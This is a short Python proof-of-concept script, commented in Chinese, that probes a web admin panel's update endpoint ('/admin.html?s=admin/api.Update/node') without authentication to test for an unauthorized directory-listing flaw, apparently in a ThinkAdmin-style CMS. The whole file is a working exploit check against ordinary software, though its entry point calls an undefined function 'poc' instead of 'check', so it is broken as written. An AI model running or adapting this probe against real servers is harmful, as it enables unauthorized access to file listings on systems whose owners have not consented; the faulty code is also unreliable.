import requests,sys

def check(**kwargs):
	url = kwargs['url']
	u = url+"/admin.html?s=admin/api.Update/node"
	data = {'rules':'["/"]'}
	r = requests.post(u,data=data)
	if r.status_code == 200:
		if "获取文件列表成功" in r.text:
			print("[+] %s 存在未授权列目录" % url)
			return 1
		else:
			print("[-] %s 不存在漏洞" %url)
			return
if __name__ == "__main__":
    if len(sys.argv) == 2:
        poc(sys.argv[1])
    else:
        print("Usage: python poc.py http://127.0.0.1")
